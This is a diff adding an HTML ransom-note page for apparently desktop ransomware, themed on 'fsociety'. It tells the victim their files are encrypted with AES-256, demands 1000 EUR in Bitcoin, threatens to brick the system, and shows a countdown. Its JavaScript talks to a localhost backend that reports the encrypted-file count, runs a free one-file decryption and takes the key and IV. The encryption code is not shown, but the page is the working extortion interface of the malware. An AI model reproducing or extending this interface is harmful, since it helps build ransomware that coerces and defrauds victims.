@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>fsociety — Your files are encrypted</title>
+<link href="https://fonts.googleapis.com/css2?family=IM+Fell+English&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background-color: #3a7ca5; font-family: Arial, sans-serif; font-size: 18px; color: #000; display: flex; flex-direction: column; align-items: center; padding: 20px 20px 40px; min-height: 100vh; }
+  .top-panel { background: #ffffff; border: 1px solid #ccc; border-radius: 8px; width: 95%; max-width: 1100px; padding: 14px 24px 10px; text-align: center; margin-bottom: 18px; }
+  .top-panel h1 { font-size: 26px; font-weight: bold; margin-bottom: 6px; line-height: 1.4; }
+  .msg { font-size: 17px; margin-bottom: 8px; line-height: 1.6; }
+  .red { color: #cc0000; font-weight: bold; }
+  .more-info { font-size: 13px; margin-bottom: 12px; }
+  .countdown-row { font-size: 26px; margin-bottom: 10px; }
+  .time-h,.time-m,.time-s { font-size: 48px; font-weight: bold; color: #cc0000; }
+  .sep { font-size: 20px; }
+  .divider { border: none; border-top: 1px solid #aaa; margin: 0 0 8px; }
+  .sys-info { font-size: 15px; display: flex; justify-content: center; align-items: center; gap: 30px; flex-wrap: wrap; text-align: center; }
+  .buttons { display: flex; gap: 4px; margin-bottom: 30px; flex-wrap: wrap; justify-content: center; }
+  .btn { padding: 8px 20px; font-size: 16px; border: 1px solid #888; background: #f0f0f0; cursor: pointer; text-decoration: none; border-radius: 3px; }
+  .btn:hover { background: #ddd; }
+  .btn.red-text { color: #cc0000; border-color: #cc0000; }
+  .jester-section { display: flex; flex-direction: column; align-items: center; gap: 16px; }
+  .jester-section img { width: 420px; max-width: 90vw; }
+  .jester-credit { font-size: 20px; color: #fff; letter-spacing: 3px; }
+  .jester-quote { color: #fff; font-size: 20px; text-align: center; max-width: 700px; line-height: 1.8; font-family: 'IM Fell English', serif; }
+  #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:999; }
+  #modal { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#fff; padding:20px; border-radius:8px; width:500px; max-width:90%; z-index:1000; text-align:left; }
+  #modal button { margin-top:15px; padding:6px 14px; }
+</style>
+</head>
+<body>
+
+<div id="overlay"></div>
+<div id="modal">
+  <div id="modal-content"></div>
+  <button onclick="closeModal()">Close</button>
+</div>
+
+<div class="top-panel">
+  <h1>#OPdailyallowance.<br>Your files are encrypted.</h1>
+  <p class="msg">
+    To get the key to decrypt files, you have to pay <span class="red">1000 EUR</span>
+    if payment is not made by <span class="red">tomorrow night</span> we'll brick your entire system.
+  </p>
+  <p class="more-info">More instructions forthcoming. - fsociety.</p>
+  <div class="countdown-row">
+    Time left:
+    <span class="time-h" id="ch">00</span><span class="sep">h </span>
+    <span class="time-m" id="cm">00</span><span class="sep">m </span>
+    <span class="time-s" id="cs">30</span><span class="sep">s</span>
+  </div>
+  <hr class="divider">
+  <div class="sys-info" id="sysinfo">
+    <span>Your system: <span class="red">x64</span></span>
+    <span>First connect IP: <span class="red">192.251.68.250</span></span>
+    <span>Total encrypted: <span class="red" id="filecount">...</span> files</span>
+  </div>
+</div>
+
+<div class="buttons">
+  <a class="btn" href="#" onclick="refreshPage()">Refresh</a>
+  <a class="btn red-text" href="#" onclick="showPayment()">Payment</a>
+  <a class="btn" href="#" onclick="showFAQ()">FAQ</a>
+  <a class="btn red-text" href="#" onclick="decryptDemo()">Decrypt first file for FREE</a>
+  <a class="btn" href="#" onclick="showSupport()">Support</a>
+</div>
+
+<div class="jester-section">
+  <img src="https://i.imgur.com/B8VC6or.png" alt="Jester">
+  <div class="jester-credit">J&#x39E;ST&#x39E;R &#x272A; &#x394;CTU&#x394;L&#x00B3;&#x00B3;&#x2070;&#x00B9;</div>
+  <div class="jester-quote">There's an unequal amount of good and bad in most things.<br>The trick is to figure out the ratio and act accordingly.</div>
+</div>
+
+<script>
+  function pad(n){ return String(n).padStart(2,'0'); }
+
+  async function sync() {
+    try {
+      const res = await fetch("http://localhost:8080/status");
+      const data = await res.json();
+      document.getElementById('filecount').textContent = data.files;
+      const s = data.time_left;
+      document.getElementById('ch').textContent = pad(Math.floor(s/3600));
+      document.getElementById('cm').textContent = pad(Math.floor((s%3600)/60));
+      document.getElementById('cs').textContent = pad(s%60);
+      if (s <= 0) {
+        document.getElementById('ch').textContent = '00';
+        document.getElementById('cm').textContent = '00';
+        document.getElementById('cs').textContent = '00';
+      }
+    } catch(e) {
+      console.log("Backend not reachable");
+    }
+  }
+
+  setInterval(sync, 1000);
+  sync();
+
+  function openModal(html) {
+    document.getElementById('modal-content').innerHTML = html;
+    document.getElementById('overlay').style.display = 'block';
+    document.getElementById('modal').style.display = 'block';
+  }
+
+  function closeModal() {
+    document.getElementById('overlay').style.display = 'none';
+    document.getElementById('modal').style.display = 'none';
+  }
+
+  function showFAQ() {
+    openModal(`<h2>FAQ</h2>
+      <p><b>What happened to my files?</b></p>
+      <p>Your files have been encrypted with AES-256.</p><br>
+      <p><b>Can I recover them?</b></p>
+      <p>Only with the correct key and IV after payment.</p><br>
+      <p><b>Is this real?</b></p>
+      <p>Yes.</p>`);
+  }
+
+  function showSupport() {
+    openModal(`<h2>Support</h2><p>No support available.</p>`);
+  }
+
+  function showPayment() {
+    openModal(`
+      <h2>Payment</h2>
+      <p>Send 1000 EUR in Bitcoin to:</p>
+      <input id="btc" value="bc1qexampleaddress1234567890" style="width:100%;" readonly>
+      <button onclick="document.getElementById('btc').select();document.execCommand('copy')">Copy Address</button>
+      <hr style="margin:15px 0;">
+      <p>Already paid? Enter your decryption key:</p>
+      <input type="text" id="keyInput" placeholder="KEY" style="width:100%;margin-top:8px;font-family:monospace;padding:6px;">
+      <input type="text" id="ivInput" placeholder="IV" style="width:100%;margin-top:6px;font-family:monospace;padding:6px;">
+      <button onclick="decrypt()" style="background:#cc0000;color:white;border:none;padding:8px 20px;margin-top:8px;cursor:pointer;border-radius:4px;">DECRYPT FILES</button>
+      <div id="status" style="margin-top:8px;font-size:14px;"></div>
+    `);
+  }
+
+  function refreshPage() {
+    window.chrome.webview.postMessage("refresh");
+  }
+
+  async function decryptDemo() {
+    const res = await fetch("http://localhost:8080/decryptfirst", { method: "POST" });
+    const data = await res.json();
+    if (data.file === "already_used") {
+        openModal(`<h2>Already Used</h2><p>You have already used your free decryption.</p>`);
+    } else {
+        openModal(`<h2>Decryption Complete</h2><p>Decrypted file: <b>${data.file}</b></p>`);
+    }
+  }
+
+  async function decrypt() {
+    const key = document.getElementById('keyInput').value.trim();
+    const iv = document.getElementById('ivInput').value.trim();
+    if (!key || !iv) {
+      document.getElementById('status').textContent = 'Enter both KEY and IV!';
+      document.getElementById('status').style.color = 'red';
+      return;
+    }
+    const res = await fetch('http://localhost:8080/decrypt', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ key, iv })
+    });
+    const data = await res.json();
+    if (data.success) {
+      document.getElementById('status').style.color = 'green';
+      document.getElementById('status').textContent = 'Files restored successfully!';
+    } else {
+      document.getElementById('status').style.color = 'red';
+      document.getElementById('status').textContent = 'Wrong key or IV!';
+    }
+  }
+</script>
+</body>
+</html>
